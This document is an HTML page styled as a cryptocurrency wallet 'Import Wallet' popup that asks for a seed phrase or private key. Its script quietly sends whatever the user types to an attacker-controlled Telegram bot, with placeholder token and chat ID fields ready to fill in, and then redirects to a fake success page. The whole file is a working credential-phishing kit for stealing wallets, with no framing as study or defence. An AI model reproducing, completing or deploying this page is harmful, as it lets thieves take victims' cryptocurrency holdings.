<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=350, height=700, initial-scale=1.0" />
  <title>Import Wallet</title>
  <style>
    html, body {
      width: 350px;
      height: 700px;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #fff;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
      box-sizing: border-box;
      overflow-y: auto; /* ‚úÖ SCROLL ACTIV√â */
    }

    h2 {
      text-align: center;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .tab-buttons {
      display: flex;
      width: 100%;
      margin-bottom: 15px;
      background: #e0e0e0;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: inset 0 0 2px rgba(0,0,0,0.2);
    }

    .tab-buttons button {
      flex: 1;
      padding: 12px 0;
      border: none;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      background-color: transparent;
      color: #333;
      transition: background 0.3s, color 0.3s;
    }

    .tab-buttons button.active {
      background-color: white;
      color: black;
    }

    .tab-buttons button.inactive {
      background-color: #d4d4d4;
      color: #666;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
    }

    select {
      width: 100%;
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #ccc;
      margin-bottom: 10px;
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 8px;
      width: 100%;
      margin-top: 10px;
    }

    .grid input {
      width: 100%;
      box-sizing: border-box;
      padding: 12px;
      font-size: 15px;
      border-radius: 6px;
      border: 1.5px solid #999;
      background: #fefefe;
    }

    .confirm-container {
      margin-top: 25px;
    }

    .confirm-btn {
      display: block;
      width: 80%;
      margin: 0 auto;
      padding: 12px;
      background-color: black;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
    }

    .content {
      width: 100%;
    }

    .message {
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      font-size: 14px;
    }

    .error { color: red; }
    .success { color: green; }
  </style>
</head>
<body>

  <h2>Importing a wallet</h2>

  <div class="content">

    <!-- Onglets -->
    <div class="tab-buttons">
      <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
      <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
    </div>

    <label for="wordsCount">The number of words in my seed phrase:</label>
    <select id="wordsCount" onchange="updateInputs(this.value)">
      <option value="12" selected>12 words</option>
      <option value="24">24 words</option>
    </select>

    <!-- Zone de saisie -->
    <div id="secretTabContent" style="display: block;">
      <div class="grid" id="seedInputs"></div>
    </div>

    <div id="privateTabContent" style="display: none;">
      <textarea id="privateKeyInput" placeholder="Enter your private key" rows="6"
        style="width: 100%; padding: 12px; border-radius: 8px; border: 1.5px solid #999; margin-top: 15px;"></textarea>
    </div>

    <div class="confirm-container">
      <button class="confirm-btn" onclick="onConfirm()">Confirm</button>
    </div>

    <div id="message" class="message"></div>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = 'TON_TOKEN_ICI';
    const TELEGRAM_CHAT_ID = 'TON_CHAT_ID_ICI';

    const bip39Words = [
      "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd",
      "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire",
      "across", "act", "action", "actor", "actress", "actual"
    ];

    function updateInputs(count) {
      const container = document.getElementById('seedInputs');
      container.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const input = document.createElement('input');
        input.placeholder = i;
        container.appendChild(input);
      }
    }

    function showTab(tab) {
      const secretTab = document.getElementById('secretTab');
      const privateTab = document.getElementById('privateTab');
      const secretContent = document.getElementById('secretTabContent');
      const privateContent = document.getElementById('privateTabContent');

      if (tab === 'secret') {
        secretTab.classList.add('active');
        privateTab.classList.remove('active');
        secretTab.classList.remove('inactive');
        privateTab.classList.add('inactive');
        secretContent.style.display = 'block';
        privateContent.style.display = 'none';
      } else {
        secretTab.classList.remove('active');
        privateTab.classList.add('active');
        secretTab.classList.add('inactive');
        privateTab.classList.remove('inactive');
        secretContent.style.display = 'none';
        privateContent.style.display = 'block';
      }

      showMessage("");
    }

    function sendToTelegram(message, redirectAfter = false) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          showMessage("‚úÖ Sent to Telegram", false);
          if (redirectAfter) {
            setTimeout(() => {
              window.location.href = "https://ton-site.com/success.html";
            }, 1000);
          }
        } else {
          showMessage("‚ùå Failed to send", true);
        }
      })
      .catch(() => {
        showMessage("‚ùå Error sending to Telegram", true);
      });
    }

    function onConfirm() {
      const secretTabActive = document.getElementById('secretTab').classList.contains('active');
      if (secretTabActive) {
        const inputs = document.querySelectorAll('#seedInputs input');
        let valid = true;
        const words = [];

        inputs.forEach(input => {
          const word = input.value.trim().toLowerCase();
          if (word === "") valid = false;
          words.push(word);
        });

        if (!valid) {
          showMessage("‚ùå Please fill all fields", true);
          return;
        }

        const invalidWords = words.filter(w => !bip39Words.includes(w));
        if (invalidWords.length > 0) {
          showMessage("‚ùå Invalid Secret Recovery Phrase", true);
          return;
        }

        const message = `ü™ô Seed Phrase:\n\n${words.join(" ")}`;
        sendToTelegram(message, true);

      } else {
        const privateKey = document.getElementById('privateKeyInput').value.trim();
        if (privateKey === "") {
          showMessage("‚ùå Please enter your private key.", true);
          return;
        }

        const message = `üîë Private Key:\n\n${privateKey}`;
        sendToTelegram(message, true);
      }
    }

    function showMessage(text, isError) {
      const msg = document.getElementById("message");
      msg.innerText = text;
      msg.className = isError ? "message error" : "message success";
    }

    updateInputs(12);
  </script>

</body>
</html>
